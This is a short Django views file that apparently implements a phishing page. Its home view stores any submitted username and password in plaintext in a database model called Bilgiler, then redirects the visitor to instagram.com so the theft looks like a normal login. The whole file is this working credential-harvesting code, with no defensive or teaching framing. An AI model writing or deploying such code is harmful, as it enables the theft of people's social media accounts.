from django.shortcuts import render
from .models import Bilgiler
from django.http import HttpResponseRedirect





def home(request):
    if request.method =="POST":
        inf = Bilgiler()
        inf.username = request.POST.get("username")
        inf.password = request.POST.get("password")
        inf.save()
        return HttpResponseRedirect("https://www.instagram.com")
    return render(request , "index.html")

